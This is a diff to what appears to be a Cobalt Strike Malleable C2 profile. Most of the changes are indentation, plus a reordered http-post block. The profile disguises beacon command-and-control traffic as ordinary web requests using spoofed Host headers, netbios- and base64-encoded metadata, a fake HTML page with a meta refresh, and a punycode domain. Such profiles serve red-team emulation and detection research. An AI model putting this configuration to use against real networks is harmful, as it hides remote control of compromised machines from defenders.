@@ -17,18 +17,17 @@ http-get {
     
     client {
 
-	header "Accept" "text/html, application/xhtml+xml, */*";
-	header "Accept-Language" "en-US";	
-	header "Accept-Encoding" "gzip, deflate";
-	header "Host" "redirect.turself-josented.com";
+        header "Accept" "text/html, application/xhtml+xml, */*";
+        header "Accept-Language" "en-US";
+        header "Accept-Encoding" "gzip, deflate";
+        header "Host" "redirect.turself-josented.com";
         header "Connection" "Keep-Alive";
 	
 	
         
         metadata {
             netbios;
-	    parameter "target";
-
+	        parameter "target";
 
         }
 
@@ -38,21 +37,21 @@ http-get {
     server {
 
         header "Server" "nginx";
-	header "Content-Type" "text/html;charset=UTF-8";
-	header "Connection" "keep-alive";
-	header "Cache-Control" "no-store, no-cache, pre-check=0, post-check=0";
-	header "Expires" "Thu, 01 Jan 1970 00:00:00 GMT";
-	header "Pragma" "no-cache";
+        header "Content-Type" "text/html;charset=UTF-8";
+        header "Connection" "keep-alive";
+        header "Cache-Control" "no-store, no-cache, pre-check=0, post-check=0";
+        header "Expires" "Thu, 01 Jan 1970 00:00:00 GMT";
+        header "Pragma" "no-cache";
         
 
         output {
             base64;
-	    prepend "105";
-	    prepend "<html><head><link rel=\"icon\" type=\"image/gif\" href=\"data:image/gif;base64,";
+            prepend "105";
+            prepend "<html><head><link rel=\"icon\" type=\"image/gif\" href=\"data:image/gif;base64,";
 
-	    append "\"/><meta http-equiv=\"refresh\" content=\"0;URL='http://xn-b1aanbboc3ad8jee4bff.xn--p1ai/gav4.php'\" /></head><body></body></html>";
+            append "\"/><meta http-equiv=\"refresh\" content=\"0;URL=\'http://xn-b1aanbboc3ad8jee4bff.xn--p1ai/gav4.php\'\" /></head><body></body></html>";
 
-	    print;
+            print;
         }
     }
 }
@@ -70,19 +69,15 @@ http-post {
 	header "Accept-Language" "en-US";
 	header "Host" "xn--b1aanbboc3ad8jee4bff.xn--p1ai";
 #	header "Connection" "Keep-Alive";
-        
-        output {
-            netbios;
-	    print;
 
-        }
-        
-  	     
         id {
             netbios;
-	    prepend "http://........../redirect.php?acsc=";
-	    header "Referer";
-
+	        prepend "http://........../redirect.php?acsc=";
+	        header "Referrer";
+        }
+        output {
+            netbios;
+	        print;
         }
     }
 
@@ -120,13 +115,13 @@ http-stager {
 
     server {
         header "Server" "openresty";
-	header "Content-Type" "text/html; charset=utf-8";
-	header "Keep-Alive" "timeout=2, max=100";
-	header "Connection" "Keep-Alive";
-	header "Location" "http://xn--b1aanbboc3ad8jee4bff.xn--p1ai/redirect.php?acsc=93042904";
-	#has 2 r's in 'referrer'	
-	header "Referrer-Policy" "no-referrer";
-	header "Vary" "Accept-Encoding";
+        header "Content-Type" "text/html; charset=utf-8";
+        header "Keep-Alive" "timeout=2, max=100";
+        header "Connection" "Keep-Alive";
+        header "Location" "http://xn--b1aanbboc3ad8jee4bff.xn--p1ai/redirect.php?acsc=93042904";
+        #has 2 r's in 'referrer'
+        header "Referrer-Policy" "no-referrer";
+        header "Vary" "Accept-Encoding";
     
     }
 
